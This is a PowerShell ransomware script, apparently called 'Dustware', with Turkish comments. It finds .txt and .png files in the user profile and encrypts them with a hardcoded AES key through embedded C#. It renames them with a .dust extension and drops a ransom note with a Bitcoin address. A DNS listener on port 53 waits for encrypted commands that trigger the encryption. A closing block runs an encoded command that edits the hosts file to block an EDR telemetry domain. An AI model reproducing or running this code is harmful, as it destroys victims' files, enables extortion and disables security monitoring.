# ==================================================
#  ENES POWERSHELL RANSOMWARE + DNS C2
# ==================================================

# Sabit AES Key
$k9f3 = "YkU7gH3kLp9sTmVzR2dJ5qW6mA0xZc8B"
$AESKey = [System.Text.Encoding]::UTF8.GetBytes($k9f3.Substring(0,32))
$IV = New-Object Byte[] 16

# [1] Dosya arama
Write-Host "[*] Dosya taraması başlatılıyor..."
$__f1leX = @()
$__extz = ".txt", ".png"
gci $env:userprofile -Recurse -ErrorAction SilentlyContinue | Where-Object {
    !$_.PSIsContainer -and ($__extz -contains $_.Extension)
} | ForEach-Object {
    $__f1leX += $_.FullName
}

# [2] Dosya yollarını temp’e yaz
$__p4th = Join-Path $env:TEMP ([guid]::NewGuid().ToString() + ".dtx")
$__f1leX | Out-File $__p4th -Encoding UTF8

Write-Host "[+] Dosya listesi kaydedildi: $__p4th"

# [3] C# kodu hazırlama
$__c0d3 = @"
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class Dusty {
    public static void Encode(string list, string key) {
        byte[] k = Encoding.UTF8.GetBytes(key.Substring(0,32));
        byte[] iv = new byte[16];

        foreach (string path in File.ReadAllLines(list)) {
            try {
                byte[] b = File.ReadAllBytes(path);
                using (Aes aes = Aes.Create()) {
                    aes.Key = k;
                    aes.IV = iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    byte[] enc = aes.CreateEncryptor().TransformFinalBlock(b, 0, b.Length);
                    File.WriteAllBytes(path, enc);
                    File.Move(path, path + ".dust");
                }
            } catch {}
        }

        File.WriteAllText(
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
            "!!_DUSTWARE_README.txt"),
            @"All your files are encrypted.

BTC: 1DustWallet
Contact: dust@protonmail.com"
        );
    }
}
"@

# [4] Add-Type ile C# compile et
Add-Type -TypeDefinition $__c0d3

# [5] Şifreleme fonksiyonu (çağırmaya hazır)
function Invoke-Dustware {
    param (
        [string]$ListFile
    )
    Write-Host "[*] Ransomware çalışıyor..."
    [Dusty]::Encode($ListFile, $k9f3)
    Write-Host "[+] Şifreleme tamamlandı."
}

# ==========================
# DNS TUNNEL C2
# ==========================

# AES Şifre Çöz
function Decrypt-AES {
    param($encBytes)

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = "CBC"
    $aes.Padding = "PKCS7"
    $aes.Key = $AESKey
    $aes.IV = $IV

    $decryptor = $aes.CreateDecryptor()
    $plaintext = $decryptor.TransformFinalBlock($encBytes, 0, $encBytes.Length)
    return [System.Text.Encoding]::UTF8.GetString($plaintext)
}

# DNS Query parsing
function Parse-DNSQuery {
    param([Byte[]]$data)

    $i = 12
    $domainParts = @()
    $length = $data[$i]
    while ($length -ne 0) {
        $i++
        $part = [System.Text.Encoding]::ASCII.GetString($data[$i..($i + $length - 1)])
        $domainParts += $part
        $i += $length
        $length = $data[$i]
    }
    return ($domainParts -join ".")
}

# UDP Dinleme
$udp = New-Object System.Net.Sockets.UdpClient 53
$remoteEP = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any, 0)

Write-Host "[+] DNS tünel dinlemesi başlatıldı (Port 53)..."

while ($true) {
    $recv = $udp.Receive([ref]$remoteEP)
    try {
        $domain = Parse-DNSQuery -data $recv
        Write-Host "[DNS Query] $domain"

        $b64 = $domain.Split(".")[0]
        $encryptedBytes = [System.Convert]::FromBase64String($b64)
        $msg = Decrypt-AES $encryptedBytes

        Write-Host "[+] Çözülen mesaj: $msg"

        if ($msg.ToLower() -eq "encrypted") {
            Invoke-Dustware -ListFile $__p4th
        }
        elseif ($msg.ToLower() -eq "decrypted") {
            Write-Host "[!] Çözme komutu geldi. (Kod eklenmedi)"
        }
        else {
            Write-Host "[?] Bilinmeyen komut alındı: $msg"
        }

    } catch {
        Write-Host "[!] Çözümleme hatası: $_"
    }
}

# ==========================
# ANTI-BYPASS (HOSTS HACK)
# ==========================
# EDR domain bloklama
$cmd = 'Add-Content -Path "$env:SystemRoot\System32\drivers\etc\hosts" -Value "127.0.0.1`ttele.edr.cloud"'
$enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
powershell -EncodedCommand $enc

